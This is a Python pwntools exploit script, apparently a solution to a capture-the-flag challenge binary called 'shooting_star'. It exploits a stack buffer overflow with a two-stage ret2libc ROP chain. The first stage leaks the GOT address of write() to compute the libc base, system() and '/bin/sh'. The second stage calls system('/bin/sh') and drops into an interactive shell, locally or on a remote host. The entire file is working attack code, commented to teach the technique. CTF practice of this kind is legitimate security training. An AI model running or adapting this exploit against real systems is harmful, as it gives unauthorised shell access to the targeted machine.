from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './shooting_star'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Need pop RDI gadget to pass 'sh' to system():
# ropper - f shooting_star - -search "pop rdi"
pop_rdi = 0x4012cb
# Need pop RSI to put got.write address in (before leaking via plt.write)
pop_rsi_r15 = 0x4012c9  # pop rsi; pop r15; ret;
info("%#x pop_rdi", pop_rdi)
info("%#x pop_rsi_r15", pop_rsi_r15)

# Build the payload
payload = flat(
    {offset: [
        pop_rsi_r15,  # Pop the following value from stack into RSI
        elf.got.write,  # Address of write() in GOT
        0x0,  # Don't need anything in r15
        elf.plt.write,  # Call plt.write() to print address of got.write()
        elf.symbols.main  # Return to beginning of star function
    ]}
)

# Send the payload
io.sendlineafter('>', '1')
io.sendlineafter('>>', payload)
io.recvuntil('May your wish come true!\n')

# Get our leaked got.write address and format it
leaked_addr = io.recv()
got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
info("leaked got_write: %#x", got_write)

# We can get libc base address by subtracting offset of write
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep write
libc_base = got_write - 0xeef20
info("libc_base: %#x", libc_base)

# Now we can calculate system location:
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# Could have also got offset in GDB-pwndbg with 'print &system - &write'
system_addr = libc_base + 0x48e50
info("system_addr: %#x", system_addr)

# We also need /bin/sh offset, can get in GDB using 'search -s "/bin/sh"'
# Can also get with 'strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"'
bin_sh = libc_base + 0x18a156
info("bin_sh: %#x", bin_sh)

# Now let's build our actual payload, using the system() address
payload = flat(
    {offset: [
        pop_rdi,  # Pop the following value from stack into RDI
        bin_sh,  # Pop me plz xD
        system_addr  # Now call system('sh')
    ]}
)

# Send the payload
io.sendline('1')
io.sendlineafter('>>', payload)
io.recvuntil('May your wish come true!\n')

# Got Shell?
io.interactive()
